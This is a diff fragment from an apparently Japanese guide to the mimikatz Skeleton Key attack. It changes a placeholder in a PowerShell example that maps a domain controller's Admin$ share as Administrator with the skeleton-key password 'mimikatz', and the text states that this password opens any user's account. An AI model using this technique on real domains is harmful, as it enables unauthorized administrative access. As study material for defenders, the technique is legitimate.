@@ -542,7 +542,7 @@ misc::skeleton
 3. パスワード：mimikatzで任意のユーザーにアクセス可能になる
 ```powershell
 # 例：DCのAdmin共有にアクセス
-net use c:\\[DC]\Admin$ /user:Administrator mimikatz
+net use c:\\<DC>\Admin$ /user:Administrator mimikatz
 ```
 
 ---
